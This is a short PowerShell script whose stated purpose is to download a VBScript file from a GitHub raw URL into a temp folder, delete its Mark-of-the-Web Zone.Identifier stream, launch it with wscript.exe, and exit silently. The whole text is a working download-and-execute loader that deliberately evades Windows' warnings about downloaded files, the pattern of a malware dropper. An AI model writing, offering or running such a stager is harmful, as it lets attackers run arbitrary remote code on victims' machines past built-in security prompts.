<#
.SYNOPSIS
    Downloads and runs a VBScript (.vbs) file in %TEMP%\MyVBSTemp.
.DESCRIPTION
    This script downloads a specified .vbs file, removes MOTW, and runs it using wscript.exe.
.NOTES
    Requires PowerShell 3.0 or later.
#>

# Define the temp folder path and ensure it exists
$folderPath = "$env:TEMP\MyVBSTemp"
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}

# Define the URL and local path for the .vbs file
$vbsFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/100%25.vbs"  # Update this URL
$vbsFilePath = Join-Path $folderPath "100%25.vbs"

# Function to download the .vbs file with error handling
function Download-File {
    param (
        [string]$url,
        [string]$filePath
    )

    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $filePath)
        return $true
    } catch {
        Write-Error "Error downloading file: $_"
        return $false
    }
}

# Start the download and run process
if (Download-File -url $vbsFileURL -filePath $vbsFilePath) {
    if (Test-Path $vbsFilePath) {
        try {
            # Remove MOTW if it exists
            if (Test-Path "$vbsFilePath:Zone.Identifier") {
                Remove-Item "$vbsFilePath:Zone.Identifier" -Force
            }

            # Run the VBS file
            Start-Process "wscript.exe" -ArgumentList "`"$vbsFilePath`""
        } catch {
            Write-Error "Failed to run VBS file: $_"
        }
    } else {
        Write-Error "Download failed. File not found at expected location."
    }
} else {
    Write-Error "Download-File function failed."
}

# Exit silently
exit
